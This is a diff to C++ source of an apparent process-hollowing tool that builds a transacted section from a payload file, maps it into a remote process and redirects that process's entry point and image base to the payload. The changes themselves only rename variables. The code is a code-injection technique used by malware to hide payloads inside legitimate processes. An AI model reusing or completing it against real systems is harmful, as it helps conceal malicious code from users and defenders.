@@ -1,6 +1,6 @@
 #include "hollowing.h"
 
-HANDLE hollowing::makeTransactedSection(PWCHAR dummy_name, PBYTE payladBuf, DWORD payloadSize) {
+HANDLE hollowing::makeTransactedSection(PWCHAR dummyName, PBYTE payladBuf, DWORD payloadSize) {
     DWORD options, isolationLvl, isolationFlags, timeout;
     options = isolationLvl = isolationFlags = timeout = 0;
 
@@ -9,7 +9,7 @@ HANDLE hollowing::makeTransactedSection(PWCHAR dummy_name, PBYTE payladBuf, DWOR
     if (hTransaction == INVALID_HANDLE_VALUE) {
         return INVALID_HANDLE_VALUE;
     }
-    HANDLE hTransactedFile = CreateFileTransactedW(dummy_name,
+    HANDLE hTransactedFile = CreateFileTransactedW(dummyName,
         GENERIC_WRITE | GENERIC_READ,
         0,
         NULL,
@@ -102,6 +102,7 @@ PVOID hollowing::mapBufferIntoProcess(HANDLE hProcess, HANDLE hSection)
 }
 
 PBYTE hollowing::getPayloadBuffer(const wchar_t* filename, SIZE_T& payloadSize) {
+
      HANDLE file = CreateFileW(filename, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
      HANDLE mapping = CreateFileMapping(file, 0, PAGE_READONLY, 0, 0, 0);
      if (!mapping) {
@@ -170,12 +171,12 @@ DWORD hollowing::getEpRva(PBYTE peBuffer) {
     return payloadNtHdrs->OptionalHeader.AddressOfEntryPoint;
 }
 
-bool hollowing::redirectEp(PBYTE loaded_pe, PVOID load_base, PROCESS_INFORMATION& pi)
+bool hollowing::redirectEp(PBYTE loadedPe, PVOID loadBase, PROCESS_INFORMATION& pi)
 {
-    DWORD ep = getEpRva(loaded_pe);
-    ULONGLONG ep_va = (ULONGLONG)load_base + ep;
+    DWORD ep = getEpRva(loadedPe);
+    ULONGLONG epVa = (ULONGLONG)loadBase + ep;
 
-    if (updateRemoteEp(pi, ep_va) == FALSE) {
+    if (updateRemoteEp(pi, epVa) == FALSE) {
         return false;
     }
     return true;
@@ -200,10 +201,10 @@ bool hollowing::setNewImageBase(PBYTE loadedPe, PVOID loadBase, PROCESS_INFORMAT
     }
     return true;
 }
-bool hollowing::redirectToPayload(PBYTE loaded_pe, PVOID load_base, PROCESS_INFORMATION& pi)
+bool hollowing::redirectToPayload(PBYTE loadedPe, PVOID loadBase, PROCESS_INFORMATION& pi)
 {
-    if (!redirectEp(loaded_pe, load_base, pi)) return false;
-    if (!setNewImageBase(loaded_pe, load_base, pi)) return false;
+    if (!redirectEp(loadedPe, loadBase, pi)) return false;
+    if (!setNewImageBase(loadedPe, loadBase, pi)) return false;
 
     return true;
 }
